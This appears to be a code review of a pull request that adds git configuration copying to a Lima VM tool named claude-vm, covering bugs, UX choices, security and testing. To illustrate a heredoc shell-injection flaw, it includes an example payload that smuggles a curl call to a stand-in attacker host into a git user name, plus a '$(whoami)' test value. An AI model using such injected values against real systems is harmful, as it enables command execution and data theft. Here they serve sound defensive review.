# Git Capability Implementation Review

## Executive Summary

The git capability implementation follows the general pattern of other capabilities but has several code quality issues and product design questions that should be addressed before merging.

**Recommendation**: Fix critical issues before merging, discuss product decisions with maintainers.

---

## Code Quality Issues

### 🔴 Critical Issues

#### 1. Wrong Environment Variable Usage (host_setup.sh:4)
```bash
VM_NAME="${1:-claude-vm}"  # ❌ Wrong - doesn't match other capabilities
```

**Problem**: Uses command-line argument `$1` instead of the `LIMA_INSTANCE` environment variable that the executor provides.

**Fix**: Change to:
```bash
# Use LIMA_INSTANCE provided by executor
VM_NAME="${LIMA_INSTANCE}"
```

**Evidence**: GPG capability uses `$LIMA_INSTANCE` (gpg/host_setup.sh:56), and executor.rs:158 sets `LIMA_INSTANCE` env var.

---

#### 2. Shell Injection Vulnerability (host_setup.sh:59-69)
```bash
limactl shell "$VM_NAME" bash <<SHELL_EOF
export GIT_USER_NAME='$GIT_USER_NAME'
export GIT_USER_EMAIL='$GIT_USER_EMAIL'
...
SHELL_EOF
```

**Problem**: Variables are expanded in the heredoc without proper escaping. If a user has special characters in their git name/email (quotes, backticks, `$()`), this could:
- Break the script
- Allow command injection (security risk)

**Example Attack Vector**:
```bash
git config --global user.name "Evil\$(curl http://attacker.com/steal)"
# Would execute the curl command when copied to VM
```

**Fix**: Use quoted heredoc or escape values properly:
```bash
# Option 1: Pass as arguments to script instead
limactl shell "$VM_NAME" git config --global user.name "$GIT_USER_NAME"

# Option 2: Use printf %q to properly quote
QUOTED_NAME=$(printf '%q' "$GIT_USER_NAME")
```

---

#### 3. Missing Error Handling (host_setup.sh:56, 59)
```bash
limactl copy "$TEMP_SCRIPT" "$VM_NAME:$TEMP_VM_SCRIPT"
limactl shell "$VM_NAME" bash <<SHELL_EOF
```

**Problem**: No error checking on critical operations. If limactl commands fail, the script continues.

**Fix**: Add error checking:
```bash
if ! limactl copy "$TEMP_SCRIPT" "$VM_NAME:$TEMP_VM_SCRIPT"; then
    echo "Error: Failed to copy setup script to VM"
    exit 1
fi

if ! limactl shell "$VM_NAME" bash <<SHELL_EOF; then
    echo "Error: Failed to configure git in VM"
    exit 1
fi
```

**Pattern**: GPG capability has proper error handling (gpg/host_setup.sh:56-59).

---

### 🟡 Medium Issues

#### 4. Overly Complex Script Generation (host_setup.sh:29-52)
**Problem**: Creates a temp script with heredoc, copies it to VM, then executes it with environment variables. This is unnecessarily complex.

**Simpler approach** (like GPG uses):
```bash
# Direct execution - no temp script needed
limactl shell "$LIMA_INSTANCE" bash <<'EOF'
set -e
git config --global user.name "$(cat /tmp/git-user-name)"
git config --global user.email "$(cat /tmp/git-user-email)"
EOF
```

Or even simpler - just run git config commands directly:
```bash
limactl shell "$LIMA_INSTANCE" git config --global user.name "$GIT_USER_NAME"
limactl shell "$LIMA_INSTANCE" git config --global user.email "$GIT_USER_EMAIL"
```

---

#### 5. Inadequate Runtime Context (capability.toml:11-18)
```bash
Git configuration:
  User: $(git config user.name 2>/dev/null || echo "not configured")
  Email: $(git config user.email 2>/dev/null || echo "not configured")
  Signing: $(git config commit.gpgsign 2>/dev/null || echo "disabled")
```

**Problem**: Doesn't show signing key or format, which is important for debugging.

**Better context** (like gh capability shows version and auth status):
```bash
mkdir -p ~/.claude-vm/context
cat > ~/.claude-vm/context/git.txt <<EOF
Git version: $(git --version 2>/dev/null || echo "not available")
User: $(git config user.name 2>/dev/null || echo "not configured")
Email: $(git config user.email 2>/dev/null || echo "not configured")
Signing: $(git config commit.gpgsign 2>/dev/null || echo "disabled")
Signing format: $(git config gpg.format 2>/dev/null || echo "default")
Signing key: $(git config user.signingkey 2>/dev/null || echo "none")
EOF
```

---

#### 6. No Git Installation Validation
**Problem**: Assumes git is installed in the VM. While this is true for Debian base image, we should validate it.

**Fix**: Add validation like GPG does:
```bash
if ! command -v git &> /dev/null; then
  echo "Error: Git not installed in VM"
  echo "This should not happen with Debian base image"
  exit 1
fi
```

---

#### 7. Missing Temp File Cleanup on Error
**Problem**: If script fails between creating temp file and the trap executing, files might be left behind.

**Current**:
```bash
TEMP_SCRIPT=$(mktemp)
trap "rm -f $TEMP_SCRIPT" EXIT
```

**Better** (but with current approach this is OK):
```bash
TEMP_SCRIPT=$(mktemp)
trap 'rm -f "$TEMP_SCRIPT"' EXIT ERR INT TERM
```

---

### 🟢 Minor Issues

#### 8. Inconsistent CLI Flag Documentation
- README shows both `-A` and `--forward-ssh-agent`
- Warning message (line 79) says `claude-vm run --forward-ssh-agent`
- Should pick one for consistency (suggest `-A` as it's shorter)

#### 9. Timestamp Collision Potential (host_setup.sh:55)
```bash
TEMP_VM_SCRIPT="/tmp/git_setup_$(date +%s).sh"
```

**Problem**: If setup runs twice in the same second, files could collide.

**Fix**: Use `$$` (PID) or mktemp:
```bash
TEMP_VM_SCRIPT="/tmp/git_setup_$$.sh"
# Or even better - let VM handle temp file creation
```

---

## Product/UX Issues

### 🔴 Critical Product Decisions

#### 1. Graceful Degradation vs. Hard Failure
**Current behavior**: If git not configured on host, shows warning and exits 0 (success).

**Question**: Should enabling the git capability without having git configured be an error?

**Arguments for current approach** (exit 0):
- ✅ Less frustrating - setup succeeds, just git isn't configured
- ✅ User can configure git later and re-run setup
- ✅ Doesn't block setup of other capabilities

**Arguments for hard failure** (exit 1):
- ✅ User explicitly requested git capability, should be configured
- ✅ Clear feedback that something is wrong
- ✅ Consistent with GPG capability (fails if GPG not available)
- ✅ Prevents confusion: "I enabled git but it doesn't work"

**Recommendation**: Make it a hard failure (exit 1) to match GPG pattern and set clear expectations.

---

#### 2. Local vs Global Git Config
**Current**: Only reads `git config --global`

**Problem**: Many developers use local git config that overrides global. Example:
```bash
# Global config
git config --global user.email "personal@gmail.com"

# Work project - local config
cd ~/work-project
git config user.email "work@company.com"
```

If user runs `claude-vm setup --git` from work project, it copies personal email, not work email.

**Options**:
1. **Keep current behavior** - only global config (simple, predictable)
2. **Read local config first, fall back to global** (matches git behavior)
3. **Read both and warn if different** (safest, most informative)

**Recommendation**: Option 3 - Read local config first (without --global flag), show what was detected, warn if different from global.

---

#### 3. Signing Configuration Coupling
**Current**: Automatically copies signing config from host to VM

**Question**: What if user wants different signing behavior in VM vs host?

**Scenarios**:
- User signs commits on host but doesn't want to in VM (testing, faster commits)
- User doesn't sign on host but wants to in VM (development workflow)
- User has different keys for different contexts

**Recommendation**: Add optional flag/config to control signing separately:
```toml
[tools.git]
enabled = true
copy_signing = true  # Optional, default true
```

Or separate capability:
```toml
[tools]
git = true          # Identity only
git_signing = true  # Also copy signing config
```

---

### 🟡 Medium UX Issues

#### 4. Warning Timing and Visibility
**Problem**: Warnings shown AFTER setup completes. Users might miss them or not understand they need to take action.

**Current flow**:
```
1. Setup runs
2. Git configured
3. Warning shown: "Enable GPG capability for signing"
4. User closes terminal or ignores warning
5. Later: "Why doesn't commit signing work?"
```

**Better flow**:
```
1. Setup detects signing enabled
2. WARNING shown BEFORE starting: "GPG signing detected. This requires gpg capability."
3. Ask user: "Continue anyway? (y/n)"
4. If yes, proceed and show warning again at end
```

---

#### 5. No Verification or Testing
**Problem**: Script configures git but doesn't verify it works.

**Suggestion**: Add optional verification at end:
```bash
echo "Verifying git configuration..."
limactl shell "$LIMA_INSTANCE" bash <<'EOF'
git config --list | grep user.name
git config --list | grep user.email
echo "✓ Git configured successfully"
EOF
```

---

#### 6. SSH Signing Key Format Ambiguity
**Warning** (line 81): Shows `user.signingkey` value, but for SSH signing this could be:
- File path: `~/.ssh/id_ed25519.pub`
- Key itself: `ssh-ed25519 AAAA...`
- Key reference: `key::ssh-ed25519 AAAA...`

**Problem**: User might not understand what the value means or how to verify it's in their SSH agent.

**Better message**:
```
- Your signing key: ~/.ssh/id_ed25519.pub
- Verify it's loaded: ssh-add -L | grep <key-content>
- Or add it: ssh-add ~/.ssh/id_ed25519
```

---

### 🟢 Minor UX Issues

#### 7. Inconsistent Capability Flag Naming
Looking at other capabilities:
- `--docker` (tool name)
- `--node` (tool name)
- `--gpg` (tool name)
- `--git` (tool name) ✅ Consistent

This is actually good - follows the pattern!

---

## Missing Features

### Should Consider Adding

1. **Git version information** in context
   - Show git version in vm_runtime context
   - Useful for debugging git behavior differences

2. **Branch protection verification**
   - Check if signing is required for current branch
   - Warn if signing required but not configured

3. **Multiple identity support**
   - Some users have different git identities for different projects
   - Could support project-specific git config

4. **Commit signing test**
   - Optional smoke test during setup to verify signing works
   - `git commit --allow-empty -m "test" -S`

---

## Security Review

### ✅ Good Security Practices
1. ✅ Only copies specific config values (not entire .gitconfig)
2. ✅ No private key material copied to VM
3. ✅ Uses `set -e` for fail-fast
4. ✅ Temp file cleanup with trap

### ⚠️ Security Concerns
1. ⚠️ **Shell injection vulnerability** (see Critical Issue #2)
2. ⚠️ No validation of config values before copying
3. ⚠️ Signing key value exposed in warning message (might contain sensitive data)

---

## Comparison with Similar Capabilities

| Feature | GPG Capability | Git Capability | Match? |
|---------|---------------|----------------|--------|
| Uses LIMA_INSTANCE | ✅ | ❌ | No |
| Validates tool on host | ✅ | ❌ | No |
| Error handling | ✅ | ❌ | No |
| Graceful degradation | ❌ (fails hard) | ✅ (exit 0) | Different philosophy |
| Runtime context | ✅ Minimal | ✅ Minimal | Yes |
| Temp file cleanup | ✅ | ✅ | Yes |
| Informative warnings | ✅ | ✅ | Yes |

**Conclusion**: Git capability doesn't follow GPG patterns closely enough.

---

## Documentation Review

### Changelog ✅
- Clear description of feature
- Lists all capabilities
- Mentions graceful handling (though we might change this)

### README
**Good**:
- Clear explanation of what git capability does
- Examples for both GPG and SSH signing
- Shows integration with other capabilities

**Issues**:
- Line 779: Says `claude-vm run` but that command doesn't exist (should be just `claude-vm`)
- Missing example of what happens when git not configured on host
- Could use example of verification after setup

---

## Testing Recommendations

### Unit Tests Needed
1. **Config parsing**: git capability in TOML
2. **Config enabling**: `tools.git = true` is respected
3. **Registry**: git capability loaded correctly

### Integration Tests Needed
1. **No git config on host**: Verify behavior (currently exit 0, maybe should be exit 1)
2. **Basic config**: Name and email copied correctly
3. **GPG signing**: Config copied, warning shown, integration with GPG capability
4. **SSH signing**: Config copied, SSH warning shown
5. **Special characters**: Name/email with quotes, spaces, unicode
6. **Missing signing key**: Signing enabled but no key configured
7. **Local vs global config**: Different local and global values

### Manual Testing Checklist
- [ ] Enable git capability: `claude-vm setup --git`
- [ ] Verify git config in VM: `claude-vm shell` → `git config --list`
- [ ] Test with GPG signing enabled on host
- [ ] Test with SSH signing enabled on host
- [ ] Test without git configured on host
- [ ] Test with special characters in name: `"O'Brien $(whoami)"`
- [ ] Verify context file: `cat ~/.claude-vm/context/git.txt`
- [ ] Test with both git and gpg capabilities: `claude-vm setup --git --gpg`

---

## Recommendations Summary

### Must Fix Before Merge (Critical)
1. ✅ Change VM_NAME to use LIMA_INSTANCE environment variable
2. ✅ Fix shell injection vulnerability with proper quoting
3. ✅ Add error handling for limactl commands
4. ✅ Decide: exit 0 or exit 1 when git not configured?

### Should Fix (Medium Priority)
5. Simplify script execution (remove unnecessary temp script)
6. Improve runtime context (show version, signing format, key)
7. Add git installation validation in VM
8. Consider local vs global config precedence
9. Fix README command error (claude-vm run → claude-vm)

### Nice to Have (Low Priority)
10. Add verification step after configuration
11. Improve SSH signing key guidance in warning
12. Add comprehensive integration tests
13. Consider separate git_signing capability or flag

---

## Conclusion

The implementation is **structurally sound** and follows the general capability pattern, but has several **critical bugs** that must be fixed before merging:

- Shell injection vulnerability
- Wrong environment variable usage
- Missing error handling

The **product design** also needs clarification:
- Should missing git config be an error or warning?
- Should we respect local git config over global?
- How much should signing be coupled to identity?

**Overall grade**: B- (would be C without the thorough plan that was followed)

**Estimated effort to fix**: 2-3 hours for critical issues + product decisions
